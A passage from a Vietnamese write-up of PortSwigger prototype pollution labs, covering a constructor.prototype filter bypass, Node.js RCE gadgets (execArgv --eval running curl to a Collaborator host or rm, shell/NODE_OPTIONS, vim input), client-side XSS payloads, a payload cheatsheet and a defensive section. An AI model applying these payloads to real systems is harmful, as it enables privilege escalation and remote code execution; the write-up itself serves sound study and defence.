Trong ghi chú, mình thử đổi tên key thành `__proto__x` và thấy server vẫn nhận key đó. Điều này gợi ý có bộ lọc nhắm vào tên `__proto__`, nhưng chưa có nghĩa mọi đường đến prototype đều bị chặn.

![Server phản chiếu nguyên key __proto__x trong response và isAdmin vẫn là false](lab-bypassing-input-filters.png)
_Key `__proto__x` được nhận như dữ liệu bình thường và xuất hiện nguyên dạng trong response. Đây chưa phải pollution; bước tiếp theo là thử đường dẫn `constructor.prototype`._

Quay lại phần kiến thức nền: với object thông thường, `obj.constructor` có thể trả về `Object`, rồi `.prototype` dẫn đến `Object.prototype`.

Để kiểm tra hành vi trước, có thể thêm:

```json
"constructor": {
  "prototype": {
    "json spaces": 10
  }
}
```

Nếu response Raw thay đổi độ thụt lề, chuyển sang gadget leo quyền có trong ghi chú:

```json
"constructor": {
  "prototype": {
    "isAdmin": true
  }
}
```

Sau đó reload, vào admin panel và xóa `carlos`.

Luồng cần hình dung là:

```text
object đích
  → constructor (Object)
  → prototype (Object.prototype)
  → isAdmin = true
```

Bypass này đòi hỏi code xử lý cho phép đi qua constructor. Một hàm merge chỉ xử lý object theo quy tắc khác, từ chối function hoặc luôn tạo own property mới có thể không đi theo đường này. Vì vậy phải kiểm tra kết quả thay vì mặc định “chặn __proto__ thì constructor chắc chắn chạy”.

### 6. Lab: Remote code execution via server-side prototype pollution

**Link Lab:** [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

Trong lab này, tài khoản `wiener:peter` đã có quyền vào admin panel. Mục tiêu là xóa file `/home/carlos/morale.txt` bằng RCE.

Source vẫn nằm ở request JSON cập nhật địa chỉ. Có thể xác nhận bằng `json spaces` như trên, sau đó tìm chức năng có khả năng tạo tiến trình con. Admin panel có nút chạy các maintenance jobs, đây chính là bước kích hoạt cần chú ý.

#### Gadget `execArgv`

`child_process.fork()` tạo một tiến trình Node.js con. Option `execArgv` là mảng tham số truyền cho Node khi khởi chạy tiến trình đó. Trong cấu hình có lỗ hổng của lab, giá trị này có thể được lấy từ prototype.

Nếu điều khiển được `execArgv`, attacker có thể đưa cờ `--eval` vào để Node chạy một đoạn JavaScript:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
  ]
}
```

Thay hostname bằng Collaborator của phiên làm lab, gửi payload rồi vào admin panel chạy maintenance jobs. Callback gắn với bước kích hoạt này giúp kiểm tra chuỗi thực thi. Nếu không có callback thì cần xét cả khả năng không có `curl`, outbound bị chặn hoặc gadget không được dùng.

Payload hoàn thành mục tiêu lab trong ghi chú:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
  ]
}
```

Gửi request thôi chưa đủ. **Phải chạy job ở admin panel** để ứng dụng tạo tiến trình con và sử dụng option đã bị pollution.

```text
JSON change-address
  → hàm merge làm ô nhiễm prototype
  → execArgv tồn tại trên Object.prototype
  → admin chạy maintenance job
  → luồng tạo tiến trình con đọc execArgv
  → Node xử lý --eval
  → execSync() chạy lệnh của lab
```

Ở đây `execSync()` được chính payload JavaScript gọi từ `--eval`. Không nên nhầm với một ứng dụng vốn đã gọi `execSync()` và bị điều khiển option `shell`/`input` như phần tiếp theo.

### 7. Các gadget RCE khác trong ghi chú

Các payload này minh họa thêm hướng tìm gadget. Khả năng khai thác phụ thuộc phiên bản Node.js, dependency, option được truyền tường minh và luồng tạo process; không phải mọi lần gọi `child_process` đều đọc thuộc tính kế thừa theo cùng một cách.

#### `shell` và `NODE_OPTIONS`

```json
"__proto__": {
  "shell": "node",
  "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com"
}
```

Trong luồng bị ảnh hưởng, `shell` khiến tiến trình được chạy qua Node, còn `NODE_OPTIONS` có thể đi vào môi trường của tiến trình con. Cờ `--inspect` khiến Node xử lý hostname của inspector và có thể tạo DNS interaction.

Điểm cần phân biệt là **DNS callback không đồng nghĩa đã thực thi được lệnh tùy ý**, cũng không chứng minh debugger đang mở ra ngoài và truy cập được. Nó giúp tìm chức năng nào thực sự chạm đến cấu hình tạo tiến trình.

#### `execSync()` với `shell` và `input`

Nếu ứng dụng đã có sẵn luồng gọi `execSync()`, một hướng khác trong ghi chú là thay shell và dữ liệu stdin:

```json
"__proto__": {
  "shell": "vim",
  "input": ":! whoami\n"
}
```

Ý tưởng là dùng Vim như chương trình nhận lệnh qua stdin. `:!` yêu cầu Vim chạy lệnh hệ thống, còn `\n` trong chuỗi JSON được decode thành newline để kết thúc dòng lệnh.

Chỉ bản thân `input` không tự động trở thành code thực thi: chương trình được chạy phải hiểu dữ liệu đó như lệnh. Hướng này còn cần Vim tồn tại, cách gọi process tương thích và các option thực sự đọc được giá trị polluted. Tham khảo ý nghĩa option trong [tài liệu `child_process` của Node.js](https://nodejs.org/api/child_process.html).

---

## VI. Tìm gadget khi chưa biết phải pollute gì

Một mẹo có trong ghi chú là đặt getter để xem ứng dụng có đọc thuộc tính nghi ngờ hay không. Trong môi trường debug client-side, đặt breakpoint **trước đoạn code cần theo dõi**, rồi chạy:

```javascript
Object.defineProperty(Object.prototype, "suspectedOption", {
  configurable: true,
  get() {
    console.trace("suspectedOption was read");
    return "ntran-canary";
  }
});
```

Cho code chạy tiếp. Nếu Console in stack trace, lần theo đó để biết thuộc tính được đọc ở đâu và giá trị đi đến sink nào.

Sau khi xem xong, dọn getter:

```javascript
delete Object.prototype.suspectedOption;
```

Mình đặt `configurable: true` để còn xóa được nó. Getter chỉ có khả năng chỉ ra một lần đọc, chưa chứng minh có khai thác; nó cũng có thể làm thay đổi hành vi ghi của ứng dụng. DOM Invader giúp tự động hóa việc tìm source và gadget, nhưng kết quả cuối cùng vẫn cần được kiểm tra bằng PoC độc lập.

---

## VII. Phòng chống Prototype Pollution

Qua các lab có thể thấy hai chỗ cần xử lý: **ngăn dữ liệu đi vào prototype** và **ngăn logic nhạy cảm sử dụng thuộc tính kế thừa ngoài ý muốn**.

### 1. Giới hạn dữ liệu được phép cập nhật

Với chức năng đổi địa chỉ, server chỉ nên nhận các trường địa chỉ cần thiết, thay vì merge toàn bộ body vào object user:

```javascript
const allowedFields = [
  "address_line_1", "address_line_2", "city", "postcode", "country"
];

const update = Object.create(null);

for (const key of allowedFields) {
  if (Object.hasOwn(body, key)) {
    if (typeof body[key] !== "string") {
      throw new TypeError("Invalid address field");
    }
    update[key] = body[key];
  }
}
```

Đây là ví dụ chọn trường; ứng dụng thực tế còn cần kiểm tra độ dài, định dạng và trường bắt buộc. Với schema validator, từ chối thuộc tính dư và kiểm tra cả object lồng nhau. Quyền admin phải được xác định từ dữ liệu tin cậy phía server.

### 2. Kiểm tra từng thành phần đường dẫn

Nếu thật sự cần parser hoặc merge tổng quát, phải kiểm soát đường đi qua các key. Không chỉ chặn một chuỗi `__proto__` ở tầng ngoài rồi cho phép tự do `constructor.prototype` bên trong.

Với cấu trúc dữ liệu không cần những tên đặc biệt này, có thể từ chối `__proto__`, `constructor`, `prototype` tại mọi tầng sau khi parse. Không dùng cách xóa substring như lab flawed sanitization. Ưu tiên thư viện được duy trì và đã xử lý trường hợp này thay vì tự viết một hàm deep merge phức tạp.

### 3. Đọc own property trong logic nhạy cảm

```javascript
function canAccessAdmin(user) {
  return Object.hasOwn(user, "isAdmin") && user.isAdmin === true;
}
```

Điều này tránh việc vô tình lấy `isAdmin` từ prototype. Tuy nhiên, own property cũng chưa chắc đáng tin nếu trước đó ứng dụng cho client tự gán nó. Cần bảo vệ cả nguồn dữ liệu phân quyền.

Tương tự, khi duyệt dữ liệu:

```javascript
for (const [key, value] of Object.entries(input)) {
  // Chỉ các own enumerable properties của input.
}
```

Việc này chặn sao chép thuộc tính kế thừa từ source, nhưng vẫn phải kiểm tra key và cách truy cập target khi merge, như ví dụ ở phần III.

### 4. Dùng object không có prototype hoặc `Map`

```javascript
const config = Object.create(null);
config.transport_url = false;

const dictionary = new Map();
dictionary.set("__proto__", "ordinary data");
console.log(dictionary.get("__proto__")); // ordinary data
```

Object không có prototype sẽ không kế thừa từ `Object.prototype`. `Map` phù hợp khi chỉ cần lưu cặp key-value; dùng `set()`/`get()` để thao tác entry. Nếu cấu trúc lồng nhau vẫn chứa object thường hoặc tiếp tục bị merge không an toàn về sau, cần xử lý cả những bước đó.

### 5. Bảo vệ descriptor và loại bỏ sink nguy hiểm

Lab browser APIs cho thấy việc khóa property vẫn có thể đọc nhầm descriptor. Nên khai báo rõ giá trị đáng tin và cân nhắc descriptor không có prototype.

Ở phía sink, không cần `eval()` chỉ để gọi một method. Với ví dụ `manager.sequence`, có thể kiểm tra kiểu rồi gọi function trực tiếp thay vì nối dữ liệu thành code. Các callback cho `setTimeout()` nên là function. URL script động cần giới hạn theo nhu cầu thực sự của ứng dụng; CSP phù hợp có thể giảm tác động nhưng không sửa source pollution.

### 6. Runtime và dependency

Node.js có các tùy chọn:

```shell
node --disable-proto=throw app.js
node --disable-proto=delete app.js
```

Hai dòng là hai lựa chọn: `throw` khiến truy cập accessor `__proto__` phát sinh lỗi, còn `delete` loại bỏ accessor đó. Chúng không tự chặn đường `constructor.prototype`.

`Object.freeze(Object.prototype)` có thể ngăn sửa prototype này, nhưng cần xét tương thích với polyfill và thư viện; freeze cũng không tự bảo vệ mọi prototype hoặc mọi object lồng nhau. Cập nhật runtime, parser và thư viện merge vẫn là phần cần thiết. Có thể đối chiếu thêm các biện pháp trong [OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html).

---

## VIII. Cheatsheet từ các bài lab

### 1. Client-side

| Mục đích | Payload trong URL | Điều kiện |
| --- | --- | --- |
| Dò source với ngoặc vuông | `?__proto__[labMarker]=ntran` | Parser hỗ trợ đường dẫn ngoặc vuông và ghi không an toàn. |
| Dò source với dấu chấm | `?__proto__.labMarker=ntran` | Parser hỗ trợ đường dẫn dấu chấm. |
| Thử đường constructor | `?constructor.prototype.labMarker=ntran` | Parser cho phép đi qua constructor. |
| Gadget script URL | `?__proto__[transport_url]=data:,alert(1);` | Config đọc giá trị kế thừa và đưa vào `script.src`. |
| Gadget descriptor | `?__proto__[value]=data:,alert(1);` | Descriptor của `defineProperty()` kế thừa `value`. |
| Gadget `eval()` | `?__proto__.sequence=alert(1)-` | Chuỗi bị nối thêm `1` như trong lab alternative vector. |
| Bypass xóa substring | `?__pro__proto__to__[transport_url]=data:,alert(1);` | Sanitizer xóa một lượt rồi dùng tiếp kết quả. |
| Gadget thư viện bên thứ ba | `#__proto__[hitCallback]=alert%28document.cookie%29` | Parser đọc fragment, gadget dẫn đến sink nhận code dạng chuỗi. |

### 2. Server-side

Các object dưới đây biểu diễn phần payload cần ghép vào JSON body hợp lệ:

| Mục đích | Payload | Dấu hiệu hoặc bước kích hoạt |
| --- | --- | --- |
| Property reflection | `{"__proto__":{"labMarker":"ntran"}}` | Marker xuất hiện qua hành vi xử lý response. |
| JSON spaces | `{"__proto__":{"json spaces":10}}` | Độ thụt lề ở response Raw thay đổi trong phiên bản bị ảnh hưởng. |
| Status override | `{"__proto__":{"status":510}}` | Sau đó kích hoạt lại lỗi và so sánh error object. |
| Charset override | `{"__proto__":{"content-type":"application/json; charset=utf-7"}}` | Request tiếp theo decode UTF-7 khác baseline trong stack bị ảnh hưởng. |
| Leo quyền | `{"__proto__":{"isAdmin":true}}` | Logic phân quyền thực sự đọc giá trị polluted. |
| Bypass chặn `__proto__` | `{"constructor":{"prototype":{"isAdmin":true}}}` | Hàm xử lý cho phép đi qua `constructor.prototype`. |

Với RCE, nhớ tách riêng **request tạo pollution** và **chức năng kích hoạt process**. Trong lab cuối, phần còn thiếu sau khi gửi `execArgv` chính là nút chạy maintenance jobs.

---

## IX. Tài liệu tham khảo

- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution).
- [PortSwigger — JavaScript prototypes and inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance).
- [PortSwigger — Client-side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/client-side).
- [PortSwigger — Prototype Pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis).
- [PortSwigger — Server-side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side).
- [MDN — JavaScript Prototype Pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
- [MDN — Object.defineProperty()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty).
- [Node.js — Child process](https://nodejs.org/api/child_process.html).
- [OWASP — Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html).
